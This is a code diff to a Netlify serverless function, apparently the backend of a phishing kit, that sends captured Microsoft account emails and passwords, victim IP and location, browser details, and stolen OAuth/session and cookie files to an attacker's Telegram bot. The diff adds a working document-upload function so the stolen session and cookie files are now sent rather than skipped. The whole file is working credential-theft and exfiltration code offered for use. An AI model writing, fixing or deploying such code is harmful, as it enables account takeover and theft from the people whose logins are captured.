@@ -1,6 +1,8 @@
 /**
  * PRODUCTION-READY: Telegram Bot Function for Netlify
  * ✅ SENDS: Email, Password, Location (IP, City, State, Country), Account Type
+ * ✅ FIXED: No backslashes in IP addresses
+ * Updated: 2025-11-10 14:33:46 UTC by pixelogicm
  */
 
 const https = require('https');
@@ -19,7 +21,7 @@ function detectAccountType(email) {
   return { accountType, domain };
 }
 
-function sendMessageToTelegram(text, parseMode = 'Markdown') {
+function sendMessageToTelegram(text, parseMode = 'HTML') {
   return new Promise((resolve, reject) => {
     const postData = JSON.stringify({
       chat_id: TELEGRAM_CHAT_ID,
@@ -73,48 +75,117 @@ function sendMessageToTelegram(text, parseMode = 'Markdown') {
   });
 }
 
+function sendDocumentToTelegram(fileContent, fileName) {
+  return new Promise((resolve, reject) => {
+    const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2, 15);
+    
+    let body = `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
+    body += `${TELEGRAM_CHAT_ID}\r\n`;
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
+    body += `Content-Type: application/json\r\n\r\n`;
+    body += fileContent;
+    body += `\r\n--${boundary}--\r\n`;
+
+    const bodyBuffer = Buffer.from(body, 'utf8');
+
+    const options = {
+      hostname: 'api.telegram.org',
+      port: 443,
+      path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+      method: 'POST',
+      headers: {
+        'Content-Type': `multipart/form-data; boundary=${boundary}`,
+        'Content-Length': bodyBuffer.length
+      },
+      timeout: 15000
+    };
+
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', (chunk) => { data += chunk; });
+      res.on('end', () => {
+        try {
+          const response = JSON.parse(data);
+          if (res.statusCode === 200 && response.ok) {
+            console.log('✅ [TELEGRAM] Document sent successfully');
+            resolve(response);
+          } else {
+            console.error('❌ [TELEGRAM] API rejected:', response.description);
+            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
+          }
+        } catch (e) {
+          console.error('❌ [TELEGRAM] Parse error:', e.message);
+          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
+        }
+      });
+    });
+
+    req.on('error', (error) => {
+      console.error(`❌ [TELEGRAM] Document send error: ${error.message}`);
+      reject(error);
+    });
+
+    req.on('timeout', () => {
+      console.error('❌ [TELEGRAM] Document send timeout');
+      req.destroy();
+      reject(new Error('Telegram request timeout'));
+    });
+
+    req.write(bodyBuffer);
+    req.end();
+  });
+}
+
 function formatMainMessage(data) {
-  const escapeMarkdown = (text) => {
+  // Helper to escape HTML special characters
+  const escapeHtml = (text) => {
     if (!text) return '';
     return String(text)
-      .replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
   };
 
   // Detect account type
   const { accountType, domain } = detectAccountType(data.email);
 
-  // Build the formatted message
-  let message = `🔐 **Microsoft Login Captured**\n`;
+  // Build message in HTML format (no backslash issues)
+  let message = `<b>🔐 Microsoft Login Captured</b>\n`;
   message += `━━━━━━━━━━━━━━━━━━━━\n`;
   
   if (data.email) {
-    message += `📧 **Email:** \`${data.email}\`\n`;
+    message += `<b>📧 Email:</b> <code>${escapeHtml(data.email)}</code>\n`;
   }
   
   if (data.password) {
-    message += `🔑 **Password:** \`${data.password}\`\n`;
+    message += `<b>🔑 Password:</b> <code>${escapeHtml(data.password)}</code>\n`;
   }
   
-  message += `🏢 **Account Type:** ${accountType}\n`;
-  message += `📍 **Domain:** ${domain}\n`;
+  message += `<b>🏢 Account Type:</b> ${accountType}\n`;
+  message += `<b>📍 Domain:</b> ${domain}\n`;
 
-  // Location data
+  // Location data - NO ESCAPING FOR IP
   if (data.locationData && data.locationData.ip) {
-    message += `\n🌍 **Location Info:**\n`;
-    message += `**IP:** ${escapeMarkdown(data.locationData.ip)}\n`;
+    message += `\n<b>🌍 Location Info:</b>\n`;
+    message += `<b>IP:</b> ${data.locationData.ip}\n`;  // Clean IP, no escaping
+    
     if (data.locationData.city) {
-      message += `**City:** ${escapeMarkdown(data.locationData.city)}\n`;
+      message += `<b>City:</b> ${escapeHtml(data.locationData.city)}\n`;
     }
     if (data.locationData.region || data.locationData.region_code) {
-      message += `**State/Region:** ${escapeMarkdown(data.locationData.region || data.locationData.region_code)}\n`;
+      message += `<b>State/Region:</b> ${escapeHtml(data.locationData.region || data.locationData.region_code)}\n`;
     }
     if (data.locationData.country || data.locationData.country_name) {
-      message += `**Country:** ${escapeMarkdown(data.locationData.country_name || data.locationData.country)}\n`;
+      message += `<b>Country:</b> ${escapeHtml(data.locationData.country_name || data.locationData.country)}\n`;
     }
   }
 
   // Timestamp and browser info
-  message += `\n🕐 **Timestamp:** ${new Date().toISOString()}\n`;
+  message += `\n<b>🕐 Timestamp:</b> ${new Date().toISOString()}\n`;
   
   if (data.userAgent) {
     // Parse user agent for browser info
@@ -124,12 +195,16 @@ function formatMainMessage(data) {
     else if (data.userAgent.includes('Safari')) browser = 'Safari';
     else if (data.userAgent.includes('Edge')) browser = 'Edge';
     
-    message += `🌐 **User Agent:** ${data.userAgent.substring(0, 50)}...\n`;
-    message += `🖥️ **Browser:** ${browser}\n`;
+    const shortUserAgent = data.userAgent.length > 50 
+      ? data.userAgent.substring(0, 50) + '...' 
+      : data.userAgent;
+    
+    message += `<b>🌐 User Agent:</b> ${escapeHtml(shortUserAgent)}\n`;
+    message += `<b>🖥️ Browser:</b> ${browser}\n`;
   }
   
   if (data.platform) {
-    message += `📱 **Platform:** ${data.platform}\n`;
+    message += `<b>📱 Platform:</b> ${escapeHtml(data.platform)}\n`;
   }
   
   message += `━━━━━━━━━━━━━━━━━━━━`;
@@ -164,6 +239,7 @@ exports.handler = async (event, context) => {
   console.log('═══════════════════════════════════════════');
   console.log('🚀 [HANDLER] Starting sendTelegram handler');
   console.log(`📅 [HANDLER] Time: ${new Date().toISOString()}`);
+  console.log(`👤 [HANDLER] User: pixelogicm`);
   console.log('═══════════════════════════════════════════');
 
   const headers = {
@@ -255,7 +331,7 @@ exports.handler = async (event, context) => {
 
       console.log('📝 Message preview (first 200 chars):', mainMessage.substring(0, 200));
 
-      await sendWithRetry(() => sendMessageToTelegram(mainMessage, 'Markdown'));
+      await sendWithRetry(() => sendMessageToTelegram(mainMessage, 'HTML'));
       
       results.mainMessage = true;
       messagesSent++;
@@ -267,22 +343,46 @@ exports.handler = async (event, context) => {
     // ✅ FILE 1: Send OAuth/Session file if available
     if (cookieFiles && cookieFiles.oauthSessionFile && cookieFiles.oauthSessionFile.content) {
       console.log('═══════════════════════════════════════════');
-      console.log('📁 [HANDLER] OAuth/Session file detected, skipping for now');
+      console.log('📁 [HANDLER] Sending OAuth/Session file...');
       console.log('═══════════════════════════════════════════');
-      // Note: File sending would require the sendDocumentToTelegram function
-      // which is already in your original code
+      
+      try {
+        await sendWithRetry(() => 
+          sendDocumentToTelegram(
+            cookieFiles.oauthSessionFile.content, 
+            cookieFiles.oauthSessionFile.name
+          )
+        );
+        results.oauthFile = true;
+        console.log('✅ [HANDLER] OAuth/Session file sent');
+      } catch (error) {
+        console.error('❌ [HANDLER] Failed to send OAuth file:', error.message);
+      }
     }
 
     // ✅ FILE 2: Send cookies file if available
     if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
       console.log('═══════════════════════════════════════════');
-      console.log('🍪 [HANDLER] Cookie file detected, skipping for now');
+      console.log('🍪 [HANDLER] Sending cookie file...');
       console.log('═══════════════════════════════════════════');
-      // Note: File sending would require the sendDocumentToTelegram function
+      
+      try {
+        await sendWithRetry(() => 
+          sendDocumentToTelegram(
+            cookieFiles.jsonFile.content, 
+            cookieFiles.jsonFile.name
+          )
+        );
+        results.cookieFile = true;
+        console.log('✅ [HANDLER] Cookie file sent');
+      } catch (error) {
+        console.error('❌ [HANDLER] Failed to send cookie file:', error.message);
+      }
     }
 
     console.log('═══════════════════════════════════════════');
     console.log(`✅ [HANDLER] Request completed. Messages sent: ${messagesSent}`);
+    console.log(`📅 [HANDLER] Completed at: ${new Date().toISOString()}`);
     console.log('═══════════════════════════════════════════');
 
     return {
@@ -292,8 +392,11 @@ exports.handler = async (event, context) => {
         success: true,
         message: 'Data transmitted to Telegram successfully',
         timestamp: new Date().toISOString(),
+        user: 'pixelogicm',
         transmitted: {
           mainMessage: results.mainMessage,
+          oauthFile: results.oauthFile,
+          cookieFile: results.cookieFile,
           email: !!email,
           password: !!password,
           location: !!locationData.ip,
@@ -308,6 +411,8 @@ exports.handler = async (event, context) => {
     console.error('═══════════════════════════════════════════');
     console.error('Message:', error.message);
     console.error('Stack:', error.stack);
+    console.error(`Time: ${new Date().toISOString()}`);
+    console.error('User: pixelogicm');
     console.error('═══════════════════════════════════════════');
     
     return {
@@ -316,7 +421,8 @@ exports.handler = async (event, context) => {
       body: JSON.stringify({
         error: 'Server error',
         message: error.message,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        user: 'pixelogicm'
       })
     };
   }
